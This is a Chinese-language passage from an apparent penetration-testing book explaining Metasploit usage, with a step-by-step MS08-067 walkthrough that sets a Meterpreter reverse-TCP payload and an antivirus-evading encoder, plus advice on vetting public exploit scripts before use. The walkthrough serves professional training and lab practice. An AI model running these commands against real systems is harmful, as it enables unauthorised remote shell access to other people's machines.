
无论你使用 Nexpose 还是 Nessus（或任何其他漏洞扫描器），这对利用过程可能没有影响。一旦扫描器发现漏洞，我通常会去搜索一个可用的漏洞利用代码。我在后面的章节专门设立了一个关于漏洞搜索的部分，介绍如何根据扫描器的发现来查找漏洞利用代码，但现在我将简要描述如何使用 Metasploit 以及理解脚本以利用漏洞的重要性。

![](images/00050.jpeg)([http://www.metasploit.com](http://www.metasploit.com)) (Windows/Kali Linux)

我们最常用的利用工具是 Metasploit。Metasploit Framework 旨在用于开发、利用漏洞以及协助攻击。框架最好的部分是它是以研究为出发点开发的。我的意思是，开发你自己的 Metasploit 模块并在框架内使用它们非常容易。^([5](#part0018.html#id_10)) 这不需要太多的 Ruby 知识，但需要更多的基本脚本技能。在不花太多时间解释 Metasploit 的情况下，让我们通过一个示例来演练框架的使用。

![](images/00051.jpeg)

*   选择一个要使用的漏洞利用代码或模块
*   设置模块的选项
    *   `set` 命令用于将值输入到模块的配置中
    *   设置受害者主机和端口
    *   设置本地主机和端口
    *   可能需要设置系统版本、用户账户和其他信息
    *   执行 `show options` 命令以查看哪些选项是必需的或需要的
*   配置载荷
    *   载荷是在漏洞被利用后应该发生的事情
    *   要更好地了解载荷类型，请参考：[http://www.offensive-security.com/metasploit-unleashed/Payload_Types](http://www.offensive-security.com/metasploit-unleashed/Payload_TypesTHE)
    *   执行 `show payloads` 命令以查看所有不同类型
    *   使用 `set payloads` 来配置要使用的载荷
*   设置编码器
    *   这是在 Metasploit 中混淆攻击的基本方法。遗憾的是，这仍然经常触发杀毒软件（AV）报警，且对于渗透测试来说不可靠。我们将在本书后面讨论更好的绕过 AV 的方法。
    *   要查看编码器，请执行 `show encoders` 命令，并通过 `set encoders` 命令应用它们
*   设置附加选项
*   运行选定并配置好的攻击，执行 `exploit` 命令

因为我通常使用 Metasploit 的 CLI 版本，所以很难记住所有不同类型的命令。这里有一个快速备忘单可以帮忙：[http://www.cheatography.com/huntereight/cheat-sheets/metasploit-4-5-0-dev-15713/](http://www.cheatography.com/huntereight/cheat-sheets/metasploit-4-5-0-dev-15713/)。当然，你也可以在应用程序中输入 `help` 以获取额外帮助。

![](images/00052.jpeg)

我知道 MS08-067 漏洞非常古老，但我不仅仍然时不时发现这些漏洞，而且与其他远程攻击相比，该攻击极其稳定。对于从未尝试过 MS08-067 漏洞的人，我强烈建议搭建一个带有旧版未打补丁 Windows XP 系统的实验室，并尝试这个确切的示例。如果你是 MS08-067 专家，可以跳过这个简短的部分。

*   在 Kali 上进入 Metasploit
    *   打开终端并输入：`msfconsole`
*   要搜索漏洞，请输入：
    *   `search ms08-067`

![](images/00053.jpeg)

Figure 26 - MS08-067 Metasploit Example

要通过 MS08-067 漏洞利用系统：

*   从搜索结果中选择漏洞利用代码，输入：
    *   `use exploit/windows/smb/ms08_067_netapi`
*   查看漏洞利用代码工作所需的选项，输入：
    *   `show options`
*   设置 IP 信息，输入：
    *   `set RHOST [IP of vulnerable Windows host]`
    *   `set LHOST [IP of your machine]`
*   选择要使用的载荷和编码器，输入：
    *   `set PAYLOAD windows/meterpreter/reverse_tcp`
    *   `set ENCODER x86/shikata_ga_nai`
*   运行攻击，输入：
    *   `exploit`

![](images/00054.jpeg)

Figure 27 - MS08-067 Example

在绕过 AV 部分，我将向你展示如何创建能够绕过杀毒软件检测的 Meterpreter 反向 TCP 载荷。不再需要使用 Shikata ga nai 并祈祷杀毒软件不会检测到载荷。

![](images/00055.jpeg)

我有无数次经历：为漏洞找到了 Metasploit 中没有的漏洞利用代码。通常基于横幅抓取脚本的版本号搜索漏洞，我会在其他地方找到漏洞利用代码（查找漏洞利用代码部分）。很多时候，这些脚本/代码是用 Python、C++、Ruby、Perl、Bash 或其他类型的脚本语言编写的。

作为一名渗透测试人员，你需要熟悉如何编辑、修改、执行和理解这些代码，无论语言是什么，并能够理解漏洞利用代码为什么有效。我**不建议**你在未测试的情况下执行任何脚本。我诚实地在论坛和 Exploit-DB 上见过一些脚本，其中的 Shellcode 载荷实际上会对目标系统造成损害。脚本利用漏洞后，载荷会删除易受攻击主机上的所有内容。我相当确定，如果客户的主机系统上的所有内容都被清空，客户不会太高兴。这就是为什么你应该始终使用自己的 Shellcode，或验证脚本中的 Shellcode。

![](images/00056.jpeg)

假设你发现了一个运行着易受攻击版本的 WarFTP 服务器，并在互联网上找到了一些代码（例如：[http://downloads.securityfocus.com/vulnerabilities/exploits/22944.py](http://downloads.securityfocus.com/vulnerabilities/exploits/22944.py)）。你可能需要了解的事项：

*   如何运行该漏洞利用代码？它是什么语言？你需要编译它吗？还是需要导入任何库？
*   该漏洞利用代码运行是否需要任何依赖项？Windows 或 Linux 的版本？DEP 或 ASLR？
*   EIP 地址或任何其他寄存器或填充值是否硬编码为特定版本？它们是否需要修改？
*   该漏洞利用代码会导致服务宕机吗？你只有一次机会攻陷主机？这非常重要，因为你可能需要与客户合作或测试类似的基础设施环境。

下面是一个脚本可能的样子示例，如果运行得当，可能允许在受害者服务器上获得 Shell 访问权限。

![](images/00057.jpeg)

Figure 28 - Example Exploit

即使是 MS08-067，漏洞利用代码也依赖于操作系统和 Service Pack。幸运的是，该载荷会在利用主机之前尝试识别合适的操作系统。许多用脚本语言编写的漏洞利用代码并不考虑这些因素，而是为单一操作系统类型开发的。这就是为什么你经常会看到漏洞利用代码包含有关其测试系统的信息。即使在同一个操作系统内，操作系统的语言等因素也可能导致漏洞利用失败或造成拒绝服务。例如，下面的 PCMAN FTP 缓冲区溢出漏洞利用代码仅在法语版 Windows 7 SP1 上测试过。这不能保证该漏洞利用代码在英文版上也能成功。

![](images/00058.jpeg)

Figure 29 - FTP Exploit Example Script^([6](#part0018.html#id_12))

这就是为什么我强烈建议你在尝试任何生产主机之前，理解并测试你所有的漏洞利用代码，并根据需要修改脚本。

![](images/00059.jpeg)
